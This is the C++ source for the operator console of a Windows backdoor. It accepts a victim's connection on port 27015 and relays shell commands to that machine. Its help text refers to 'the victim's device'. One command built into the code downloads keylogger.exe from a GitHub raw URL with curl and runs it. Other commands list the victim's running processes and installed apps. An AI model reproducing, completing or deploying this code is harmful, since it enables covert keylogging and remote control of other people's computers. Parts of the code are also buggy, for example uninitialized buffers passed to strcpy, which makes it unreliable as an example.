#include <iostream>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define DEFAULT_BUFLEN 4069
#define DEFAULT_TOTALE_BUFLEN 65104
#define DEFAULT_PORT 27015

string Additions(char *buffer);
// Components Function:
string CMR_InfoComp(string buffer);
string CMR_RunComp(string buffer);
string CMR_StopComp(string buffer);

int strincludes(char *strVar, char *buffer);

string cin_string();

int main()
{

    
    // Initialze wonsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOK = WSAStartup(ver, &wsData);

    if (wsOK != 0)
    {
        cerr << "[ERR] - Can't initialze winsock ! ... Quitting" << endl;
        return 1;
    }

    // create a socket
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    char *optval;

    if (listening == INVALID_SOCKET)
    {
        cerr << "[ERR] - Can't create a socket ! ... Quitting" << endl;
        return 1;
    }

    if (setsockopt(listening, SOL_SOCKET, SO_REUSEADDR, optval, sizeof(optval)) < 0)
    {
        printf("[ERR] - Error Setting TCP Sockte Options!\n");
        return 1;
    }

    // bind the socket to an ip address and port to a socket
    sockaddr_in hint;

    hint.sin_family = AF_INET;
    hint.sin_port = htons(DEFAULT_PORT);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; // Could also use inet_pton

    bind(listening, (sockaddr *)&hint, sizeof(hint));

    // tell winsock the socket is for listening
    listen(listening, SOMAXCONN);

    // wait for a connection
    sockaddr_in client;
    int clientSize = sizeof(client);

    SOCKET clientSocket = accept(listening, (sockaddr *)&client, &clientSize);

    // while loop -> accept and echo message back to client
    char buffer[DEFAULT_BUFLEN];
    char response[DEFAULT_TOTALE_BUFLEN];

    while (true)
    {
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(response, sizeof(response));

        cout << "[SHELL] - # " << inet_ntoa(client.sin_addr) << " ~ $ ";

        fgets(buffer, sizeof(buffer), stdin);
        // buffer = cin_string();

        strtok(buffer, "\n");

        strcpy(buffer, Additions(buffer).c_str());
        cout << "[BUFF] - " << buffer << endl;

        strtok(buffer, "\n");

        int bytesSend = send(clientSocket, buffer, sizeof(buffer), 0);


        if (buffer == "q")
        {
            break;
        }
        else
        {
            // wait for client to send data
            int bytesRecv = recv(clientSocket, response, sizeof(response), 0x8);

            if (bytesRecv == SOCKET_ERROR)
            {
                cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
                break;
            }

            if (bytesRecv == 0)
            {
                cout << "[ERR] - Client disconnected " << endl;
                break;
            }

            cout << response;
        }

    }

}

string cin_string()
{
    char input[1024];
    cin.getline(input, 1024);
    return input;
}

int strincludes(char *strVar, char *buffer)
{
    char *str;
    char *buf;
    strcpy(str, strVar);
    strcpy(buf, buffer);
    if (!str || !buf)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        // printf("%s --- %s\n", buf, token);
        if (strcmp(buf, token) == 0)
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
    return 0;
}

string Additions(char *buffer)
{

    string obuf = buffer;

    if (obuf.find("apps_list ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running";
        }
        else if (obuf.find("run") != string::npos)
        {
            if (obuf.find("all") != string::npos)
            {
                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
            else
            {
                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
        }
        else if (obuf.find("all") != string::npos)
        {
            obuf = "powershell -Command \"Get-AppxPackage\"";
        }
    }
    else if (obuf.find("cmp ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = CMR_InfoComp(obuf);
        }
        else if (obuf.find("run") != string::npos)
        {
            obuf = CMR_RunComp(obuf);
        }
        else if (obuf.find("stop") != string::npos)
        {
            obuf = CMR_StopComp(obuf);
        }
    }
    return obuf;
}

/*
######################################
            Components
######################################
*/
string CMR_InfoComp(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "echo [CMP] [INFO] - This components is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\log.txt file. And the keylogger.exe file is in C:\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want, or you can use the following command: $ cmp reset keylog";
    }
    else
    {
        ebuf = "echo [CMP] [INFO] - The components are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable components :\n--> keylog\n--> fill_storage\n--> network";
    }

    return ebuf;
}

string CMR_RunComp(string buffer)
{
    string ebuf = buffer;

    string compcmd = "IF NOT EXIST \"C:\\Ms\" ( mkdir C:\\Ms ) ELSE ( echo; ) && ";


    string path = "C:\\Ms\\keylogger.exe";

    if (ebuf.find("keylog") != string::npos)
    {
        compcmd += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/keylogger.exe -o " + path + " && IF EXIST C:\\Ms\\keylogger.exe ( start C:\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - keylogger.exe components \n[CMP] [RUN] - keylog components ..";
        ebuf = compcmd;
    }
    else
    {
        ebuf = "echo [CPM] [ERR] - You must use a valid component name !";
    }

    return ebuf;
}

string CMR_StopComp(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\"";
    }

    return ebuf;
}


// echo "# backdoor" >> README.md
// git init
// git add README.md
// git commit -m "first commit"
// git branch -M main
// git remote add origin https://github.com/s3q/backdoor.git
// git push -u origin main